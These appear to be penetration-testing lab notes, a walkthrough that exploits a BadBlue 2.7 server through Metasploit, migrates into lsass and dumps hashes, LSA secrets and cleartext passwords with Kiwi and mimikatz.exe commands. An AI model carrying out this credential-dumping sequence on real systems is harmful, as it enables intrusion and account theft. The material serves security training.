# Dumping Hashes With Mimikatz

## Practice Demo

## Mimikatz

* Mimikatz is a Windows post-exploitation tool written by Benjamin Delply (@gentilkiwi). It allows for the extraction of clear-text passwords, hashes and Kerberos tickets from memory.
* The SAM (Security Accounts anager) database, is a database file on a Windows systems that stores hashed user passwords.
* Mimikatz can be used to extract hashes from the <mark style="color:red;">lsass.exe</mark> process memmory where hashes are cached.
* We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension <mark style="color:red;">Kiwi</mark>.

<mark style="color:purple;">NOTE:</mark> Mimikatz will require elevated privileges in order to run correctly.

## Practical Demo

Enumerate the target

In this case the target is running <mark style="color:red;">BadBlue 2.7</mark> on port 80

### MSF Module

* <mark style="color:yellow;">exploit/windows/http/badblue\_passthru</mark>

We need to set the <mark style="color:red;">TARGET</mark>

Set RHOSTS and payload options

We now have 32 bit meterpreter session as an Administrator

Migrate to the "<mark style="color:red;">lsass</mark>" process to get NT AUTHORITY\SYSTEM privileges:

* <mark style="color:yellow;">pgrep lsass:</mark> Searches for LSASS process
* <mark style="color:yellow;">migrate PID</mark>

#### Load Kiwi extension:

* <mark style="color:yellow;">load kiwi</mark>

#### Help command:

* <mark style="color:yellow;">?</mark>

#### Dump all credentials:

* <mark style="color:yellow;">creds\_all</mark>

#### Dump Contents of SAM Database:

* <mark style="color:yellow;">lsa\_dump\_sam</mark>

Dump LSA Secrets

* <mark style="color:yellow;">lsa\_dump\_secrets</mark>

## Using Mimikatz executable

Navigate to the <mark style="color:red;">Temp</mark> directory in the target

Upload the Mimikatz executable:

* <mark style="color:yellow;">upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe</mark>

#### Start mimikatz:

* <mark style="color:yellow;">.\mimikatz.exe</mark>

#### Check if you have appropriate privileges:

* <mark style="color:yellow;">privilege::debug</mark>

#### Dump logon passwords

* <mark style="color:yellow;">sekurlsa::logonpasswords</mark>

#### Dump SAM database

* <mark style="color:yellow;">lsadump::sam</mark>

#### Dump lsa secrets:

* <mark style="color:yellow;">lsadump::secrets</mark>

If windows is configured to store <mark style="color:red;">logonpasswords</mark> in memory in cleartext, we can dump them:

* <mark style="color:yellow;">sekurlsa::passwords</mark>
